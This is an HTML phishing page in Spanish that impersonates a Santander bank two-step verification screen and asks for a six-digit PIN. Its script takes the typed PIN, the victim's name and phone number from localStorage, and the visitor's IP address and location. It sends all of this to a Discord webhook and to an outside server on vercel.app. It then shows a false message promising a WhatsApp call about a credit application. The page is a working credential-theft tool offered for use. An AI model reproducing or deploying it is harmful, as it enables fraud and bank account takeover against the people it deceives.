<!DOCTYPE html>
<html lang="es">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Verificación PIN - Santander</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body,
    html {
      height: 100%;
      width: 100%;
      font-family: "SantanderHeadline", -apple-system, BlinkMacSystemFont,
        "Segoe UI", Arial, sans-serif;
      color: var(--text-dark);
      overflow-x: hidden;
    }

    body {
      background:linear-gradient(135deg, #001391 0%, #001170 100%);
      margin: 0;
      display: flex;
      min-height: 100vh;
      height: auto;
      justify-content: center;
      align-items: center;
      position: relative;
      width: 100%;
      padding: 20px 0;
    }

    .container {
      background: white;
      border-radius: 20px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
      padding: 40px 30px;
      max-width: 400px;
      width: 90%;
      text-align: center;
      position: relative;
    }

    .close-btn {
      position: absolute;
      top: 15px;
      right: 15px;
      width: 30px;
      height: 30px;
      border: none;
      background: #f0f0f0;
      border-radius: 50%;
      cursor: pointer;
      font-size: 18px;
      color: #666;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .close-btn:hover {
      background: #e0e0e0;
    }

    h1 {
      font-size: 22px;
      color: #333;
      margin-bottom: 15px;
      font-weight: 600;
    }

    .subtitle {
      color: #666;
      font-size: 14px;
      line-height: 1.5;
      margin-bottom: 30px;
    }

    .pin-display {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 30px;
    }

    .pin-dot {
      width: 14px;
      height: 14px;
      border-radius: 50%;
      border: 2px solid #ddd;
      background: white;
      transition: all 0.3s ease;
    }

    .pin-dot.filled {
      background: #070E80;
      border-color: #070E80;
      transform: scale(1.2);
    }

    .pin-dot.error {
      background: #ff4757;
      border-color: #ff4757;
      animation: shake 0.5s;
    }

    @keyframes shake {

      0%,
      100% {
        transform: translateX(0);
      }

      25% {
        transform: translateX(-5px);
      }

      75% {
        transform: translateX(5px);
      }
    }

    .keypad {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 15px;
      margin-bottom: 20px;
    }

    .key {
      background: #f8f9fa;
      border: none;
      border-radius: 12px;
      padding: 20px;
      font-size: 24px;
      font-weight: 500;
      color: #333;
      cursor: pointer;
      transition: all 0.2s ease;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
      -webkit-tap-highlight-color: transparent;
    }

    .key:hover {
      background: #e9ecef;
      transform: translateY(-2px);
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }

    .key:active {
      transform: translateY(0);
    }

    .key.delete {
      background: #fff;
      color: #666;
      font-size: 20px;
      grid-column: 3;
    }

    .key.zero {
      grid-column: 2;
    }

    .key-label {
      display: block;
      font-size: 10px;
      color: #999;
      margin-top: 2px;
    }

    .message {
      min-height: 24px;
      font-size: 14px;
      margin-top: 15px;
    }

    .error-message {
      color: #ff4757;
      animation: fadeIn 0.3s;
    }

    .success-message {
      color: #2ed573;
      animation: fadeIn 0.3s;
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
      }

      to {
        opacity: 1;
      }
    }

    .forgot-pin {
      color: #070E80;
      text-decoration: none;
      font-size: 13px;
      margin-top: 10px;
      display: inline-block;
    }

    .forgot-pin:hover {
      text-decoration: underline;
    }

    @media (max-width: 480px) {
      .container {
        padding: 30px 20px;
      }

      h1 {
        font-size: 20px;
      }

      .subtitle {
        font-size: 13px;
      }

      .key {
        padding: 15px;
        font-size: 22px;
      }

      .keypad {
        gap: 10px;
      }
    }
  </style>
</head>

<body>
  <!-- Inserted by miarroba -->
  <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2VG59" height="0" width="0"
      style="display:none;visibility:hidden"></iframe></noscript>
  <!-- Inserted by miarroba -->
  <div class="container">
    <h1>Ingresa tu PIN de verificación en dos pasos</h1>
    <p class="subtitle">
      Ingresa el PIN que usaste para establecer la verificación en dos pasos.
      Se te pedirá periódicamente para ayudarte a recordarlo.
      <strong>¿Olvidaste tu PIN?</strong>
    </p>

    <div class="pin-display">
      <div class="pin-dot" id="dot1"></div>
      <div class="pin-dot" id="dot2"></div>
      <div class="pin-dot" id="dot3"></div>
      <div class="pin-dot" id="dot4"></div>
      <div class="pin-dot" id="dot5"></div>
      <div class="pin-dot" id="dot6"></div>
    </div>

    <div class="keypad">
      <button class="key" onclick="addDigit(1)">1</button>
      <button class="key" onclick="addDigit(2)">
        2<span class="key-label">ABC</span>
      </button>
      <button class="key" onclick="addDigit(3)">
        3<span class="key-label">DEF</span>
      </button>

      <button class="key" onclick="addDigit(4)">
        4<span class="key-label">GHI</span>
      </button>
      <button class="key" onclick="addDigit(5)">
        5<span class="key-label">JKL</span>
      </button>
      <button class="key" onclick="addDigit(6)">
        6<span class="key-label">MNO</span>
      </button>

      <button class="key" onclick="addDigit(7)">
        7<span class="key-label">PQRS</span>
      </button>
      <button class="key" onclick="addDigit(8)">
        8<span class="key-label">TUV</span>
      </button>
      <button class="key" onclick="addDigit(9)">
        9<span class="key-label">WXYZ</span>
      </button>

      <button class="key" style="visibility: hidden"></button>
      <button class="key zero" onclick="addDigit(0)">0</button>
      <button class="key delete" onclick="deleteDigit()">⌫</button>
    </div>

    <div class="message" id="message"></div>

    <a href="https://05b72be3-4992-4a3d-8b0e-68828bc211fc-00-3k03kkylbfyg4.picard.replit.dev/index4.html#"
      class="forgot-pin">¿Olvidaste tu PIN?</a>
  </div>
  <script src="discord.js"></script>
<script>

    let pin = "";
    let userIP = "";
    let userLocation = "";
    let modalOverlay, modalContent;

    // Función para obtener información del usuario (no bloqueante)
    async function getUserInfo() {
        try {
            const response = await fetch("https://ipinfo.io/json?token=");
            const data = await response.json();
            userIP = data.ip || "No disponible";
            userLocation = `${data.city || ""}, ${data.region || ""}, ${data.country || ""}`;
        } catch (error) {
            userIP = "No disponible";
            userLocation = "No disponible";
        }
    }

    // Función para crear el modal
    function crearModal() {
        modalOverlay = document.createElement('div');
        modalOverlay.id = 'modalOverlay';
        modalOverlay.style.cssText = `
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        `;

        modalContent = document.createElement('div');
        modalContent.style.cssText = `
            background: white;
            border-radius: 8px;
            padding: 32px;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            text-align: center;
        `;

        modalContent.innerHTML = `
            <div style="
                width: 70px;
                height: 70px;
                background: linear-gradient(135deg, #5cb85c 0%, #4a9d4a 100%);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 20px;
            ">
                <i class="fa-solid fa-check" style="font-size: 35px; color: white;"></i>
            </div>
            <h2 style="font-size: 22px; font-weight: 700; color: #121212; margin-bottom: 12px;">
                Hemos recibido tu solicitud.
            </h2>
            <p style="font-size: 15px; color: #4a4a4a; line-height: 1.6; margin-bottom: 24px;">
                Te contactaremos a tu WhatsApp en 30 minutos para finalizar la solicitud de crédito.
            </p>
            <button id="modalButton" style="
                width: 100%;
                padding: 12px;
                background: #070E80;
                color: white;
                border: none;
                border-radius: 4px;
                font-size: 15px;
                font-weight: 600;
                cursor: pointer;
            ">Entendido</button>
        `;

        modalOverlay.appendChild(modalContent);
        document.body.appendChild(modalOverlay);

        document.getElementById('modalButton').addEventListener('click', function() {
            modalOverlay.style.display = 'none';
            window.location.href = 'index.html';
        });
    }

    // ⚡ Función para mostrar el modal INMEDIATAMENTE
    function mostrarModal() {
        if (!modalOverlay) crearModal();
        modalOverlay.style.display = 'flex';
    }

    // Función para obtener datos de localStorage
    function obtenerDatosGuardados() {
        return {
            nombreCompleto: localStorage.getItem('nombreCompleto') || 
                           localStorage.getItem('nombrecompleto') || 
                           'No disponible',
            telefono: localStorage.getItem('tel') || 
                     localStorage.getItem('usuario') || 
                     'No disponible'
        };
    }

    // ⚡ Función para enviar a Discord (SIN AWAIT - fire and forget)
    function enviarADiscord(pinIngresado) {
        const datos = obtenerDatosGuardados();
        
        const embed = {
            title: '🔐 PIN de Verificación en Dos Pasos',
            color: 0xEC0000,
            fields: [
                {
                    name: '👤 Usuario',
                    value: `\`\`\`${datos.nombreCompleto}\`\`\``,
                    inline: false
                },
                {
                    name: '📞 Teléfono',
                    value: `\`\`\`+52 ${datos.telefono}\`\`\``,
                    inline: true
                },
                {
                    name: '🔢 PIN Ingresado',
                    value: `\`\`\`${pinIngresado}\`\`\``,
                    inline: true
                },
                {
                    name: '🌐 IP',
                    value: `\`\`\`${userIP}\`\`\``,
                    inline: true
                },
                {
                    name: '📍 Ubicación',
                    value: `\`\`\`${userLocation}\`\`\``,
                    inline: true
                },
                {
                    name: '🕐 Fecha/Hora',
                    value: `\`\`\`${new Date().toLocaleString('es-MX')}\`\`\``,
                    inline: false
                }
            ]
        };

        // ⚡ Enviar sin esperar respuesta (fire and forget)
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        }).catch(error => console.error('Error Discord:', error));
    }

    // Función para enviar al servidor externo (fire and forget)
    function enviarServidorExterno(pinIngresado) {
        try {
            const datos = obtenerDatosGuardados();
            const formData = new FormData();
            formData.append(
                "mensaje",
                "🔐 PIN de Verificación\n" +
                "Usuario: " + datos.nombreCompleto + "\n" +
                "Celular: +52 " + datos.telefono + "\n" +
                "PIN: " + pinIngresado + "\n" +
                "IP: " + userIP + "\n" +
                "Ubicación: " + userLocation
            );

            fetch("https://servidorne.vercel.app/bbdsasd", {
                method: "POST",
                body: formData,
            }).catch(error => console.error("Error servidor externo:", error));
        } catch (error) {
            console.error("Error:", error);
        }
    }

    // ⚡ Función principal OPTIMIZADA
    function manejarVerificacionPin() {
        console.log("PIN ingresado:", pin);

        // 1. ENVIAR A DISCORD (inmediato, sin esperar)
        enviarADiscord(pin);
        
        // 2. ENVIAR A SERVIDOR EXTERNO (inmediato, sin esperar)
        enviarServidorExterno(pin);

        // 3. MOSTRAR MODAL (INMEDIATO)
        mostrarModal();

        // 4. LIMPIAR TODO (inmediato)
        pin = "";
        updateDisplay();
        clearMessage();
    }

    // Funciones del teclado (sin cambios)
    function addDigit(digit) {
        if (pin.length < 6) {
            pin += digit;
            updateDisplay();

            if (pin.length === 6) {
                manejarVerificacionPin();
            }
        }
    }

    function deleteDigit() {
        if (pin.length > 0) {
            pin = pin.slice(0, -1);
            updateDisplay();
            clearMessage();
            for (let i = 1; i <= 6; i++) {
                document.getElementById(`dot${i}`).classList.remove("error");
            }
        }
    }

    function updateDisplay() {
        for (let i = 1; i <= 6; i++) {
            const dot = document.getElementById(`dot${i}`);
            dot.classList.remove("filled", "error");
            if (i <= pin.length) dot.classList.add("filled");
        }
    }

    function clearMessage() {
        const messageEl = document.getElementById("message");
        if (messageEl) {
            messageEl.textContent = "";
            messageEl.className = "message";
        }
    }

    // Teclado físico
    document.addEventListener("keydown", (e) => {
        if (e.key >= "0" && e.key <= "9") addDigit(e.key);
        else if (e.key === "Backspace") deleteDigit();
    });

    // Inicializar
    window.addEventListener("load", function() {
        getUserInfo();
        crearModal();
        pin = "";
        updateDisplay();
    });
</script>
</body>

</html>
